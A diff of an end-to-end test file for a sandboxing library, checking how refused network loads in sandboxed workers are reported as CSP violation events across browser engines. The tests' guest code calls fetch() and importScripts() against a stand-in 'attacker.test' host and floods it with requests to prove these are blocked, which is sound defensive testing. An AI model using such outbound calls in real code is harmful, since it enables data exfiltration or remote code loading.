@@ -1,4 +1,5 @@
 import { test, expect } from './fixture';
+import { GATE_SOURCE_FILE } from '@src/lib/violation';
 
 /**
  * Backlog S5: CSP violations in the guest reach the host as a 'violation' event on the element.
@@ -9,11 +10,12 @@ import { test, expect } from './fixture';
  *      parsed is reported, and a guest listener registered later cannot keep ours from seeing one;
  *   3. a report is a guest claim, never a host fact: synthetic events are not forwarded, a frame forged on
  *      the port is validated and clamped, and the number of events per environment is capped;
- *   4. worker mode forwards what the engine raises in the worker (measured per engine below);
+ *   4. worker mode: the request gate reports the worker's refused fetch(), XMLHttpRequest and WebSocket on every
+ *      engine; what the engine raises itself in the worker is forwarded too (per engine, below);
  *   5. strict mode (ADR-005, A6): the host labels each report by the port it arrived on, never by what the
  *      frame says. 'view' reports come from the view document, which runs no guest code, so they are the
  *      library's own and complete up to the cap, which is per port: a worker flooding its own (logic)
- *      port cannot use up the view's. 'logic' reports are the worker's, per engine as in 4.
+ *      port cannot use up the view's. 'logic' reports are the worker's: the request gate's, as in 4.
  */
 
 const ATTACKER = 'https://attacker.test';
@@ -139,12 +141,12 @@ test.describe('3. a report is a guest claim', () => {
     });
 });
 
-// Worker reports are per engine, a documented limit (ADR-005, "Worker reports"; API.md, `violation`): WebKit raises
-// no securitypolicyviolation event in a worker at all, so violation reporting from workers cannot be tested on WebKit,
-// and these tests assert that absence there. The evidence that a worker's load was refused is its outcome (below) and,
-// for egress, the recorder (test/e2e/worker-globals-and-termination.spec.ts, V1), on every engine.
+// A worker's fetch(), XMLHttpRequest and WebSocket refusals are reported by the library's request gate, on every engine,
+// with one shape (in-sandbox-script.ts, S74). What the engine raises itself in a worker stays per engine (ADR-005, "Worker
+// reports"; API.md, `violation`): WebKit raises no securitypolicyviolation event in a worker, and Firefox raises worker
+// mode's importScripts() refusals in the frame that made the worker, which reports nothing.
 test.describe('4. worker mode', () => {
-    test('reports what the engine raises in the worker: measured per engine (WebKit raises none in workers: a documented limit, asserted as such)', async ({ sandbox, browserName }) => {
+    test('a refused fetch is reported by the request gate on every engine; importScripts() refusals are what the engine raises (Chromium only)', async ({ sandbox, browserName }) => {
         expect(await sandbox.mount({ mode: 'worker' })).toBe('ready');
         const outcome = await sandbox.inGuest(`
             const fetched = await fetch('${ATTACKER}/worker-fetch', { mode: 'no-cors' }).then(() => 'reached', () => 'refused');
@@ -153,37 +155,28 @@ test.describe('4. worker mode', () => {
             return { fetched, imported };
         `);
         expect(outcome).toEqual({ fetched: 'refused', imported: 'refused' });
-        // the load outcomes above are the channel that holds in every engine; the reports differ
         await sandbox.page.waitForTimeout(500); // violation events are queued as tasks, then cross the port
-        const reported = (await sandbox.violations()).map(v => `${v.directive} ${v.blockedURI}`).sort();
-        const expected: Record<string, string[]> = {
-            // Chromium raises securitypolicyviolation in workers for both
-            chromium: [`connect-src ${ATTACKER}/worker-fetch`, `script-src-elem ${ATTACKER}/worker-import.js`],
-            // Firefox raises it for fetch, not for importScripts
-            firefox: [`connect-src ${ATTACKER}/worker-fetch`],
-            // WebKit raises none in workers: the load outcome is the only evidence there
-            webkit: [],
-        };
-        expect(reported).toEqual(expected[browserName]);
+        const reported = (await sandbox.violations()).map(v => `${v.directive} ${v.blockedURI} ${v.sourceFile ?? ''}`.trim()).sort();
+        const gate = `connect-src ${ATTACKER}/worker-fetch ${GATE_SOURCE_FILE}`;
+        expect(reported.filter(line => line.startsWith('connect-src'))).toEqual([gate]);
+        // importScripts() is the engine's: Chromium raises it in the worker, Firefox in the frame, WebKit nowhere
+        expect(reported.filter(line => line.startsWith('script-src')).map(line => line.split(' ').slice(0, 2).join(' '))).toEqual(browserName === 'chromium' ? [`script-src-elem ${ATTACKER}/worker-import.js`] : []);
     });
 });
 
 
 test.describe('5. strict mode', () => {
-    test('view reports are labelled view, worker reports logic (per engine; WebKit raises none in workers, a documented limit); a flood on the logic port is logic and uses up only the logic cap', async ({ sandbox, page, browserName }) => {
+    test('view reports are labelled view, the request gate\'s logic (the same on every engine); a flood on the logic port is logic and uses up only the logic cap', async ({ sandbox, page }) => {
         expect(await sandbox.mount({ mode: 'strict' })).toBe('ready');
-        // the worker's own refusals: Chromium raises both in the worker; Firefox raises the importScripts
-        // refusal in the VIEW (research 15, P3); WebKit raises none in workers
+        // the worker's own refusal, by the request gate; the strict worker has no importScripts
         const outcome = await sandbox.inGuest(`
             const fetched = await fetch('${ATTACKER}/worker-fetch').then(() => 'reached', () => 'refused');
-            let imported;
-            try { importScripts('${ATTACKER}/worker-import.js'); imported = 'reached'; } catch (e) { imported = 'refused'; }
-            return { fetched, imported };
+            return { fetched, importScripts: typeof importScripts };
         `);
-        expect(outcome).toEqual({ fetched: 'refused', imported: 'refused' });
+        expect(outcome).toEqual({ fetched: 'refused', importScripts: 'undefined' });
         await page.waitForTimeout(800);
-        // then a flood of real refusals in the worker, past the cap (the worker cannot post on its port itself,
-        // AR:B2, so the flood is what the engine raises: none in WebKit)
+        // then a flood of refusals in the worker, past the cap (guest code cannot post on the port itself, AR:B2: the
+        // flood is the gate's reports of what it refused)
         await sandbox.run(`for (let i = 0; i < 150; i++) fetch('${ATTACKER}/flood-' + i).catch(() => {}); console.log('flooded')`);
         await sandbox.waitForLog('flooded');
         await page.waitForTimeout(800);
@@ -192,16 +185,12 @@ test.describe('5. strict mode', () => {
         expect((await sandbox.waitForViolation('img-src', `${ATTACKER}/view.svg`)).source).toBe('view');
 
         const all = await sandbox.violations();
-        const worker = all.filter(v => v.blockedURI.startsWith(`${ATTACKER}/worker`)).map(v => `${v.source} ${v.directive}`).sort();
-        expect(worker).toEqual({
-            chromium: ['logic connect-src', 'logic script-src-elem'],
-            firefox: ['logic connect-src', 'view script-src-elem'],
-            webkit: [],
-        }[browserName]);
-        // the logic port's cap: its first reports, then the flood up to 100, every one labelled logic; the view's
+        const worker = all.filter(v => v.blockedURI.startsWith(`${ATTACKER}/worker`)).map(v => `${v.source} ${v.directive} ${v.sourceFile}`);
+        expect(worker).toEqual([`logic connect-src ${GATE_SOURCE_FILE}`]);
+        // the logic port's cap: its first report, then the flood up to 100, every one labelled logic; the view's
         // report above arrived after it, on its own count
         const flood = all.filter(v => v.blockedURI.startsWith(`${ATTACKER}/flood-`));
-        expect(all.filter(v => v.source === 'logic')).toHaveLength(browserName === 'webkit' ? 0 : 100);
-        expect(new Set(flood.map(v => v.source))).toEqual(new Set(browserName === 'webkit' ? [] : ['logic']));
+        expect(all.filter(v => v.source === 'logic')).toHaveLength(100);
+        expect(new Set(flood.map(v => v.source))).toEqual(new Set(['logic']));
     });
 });
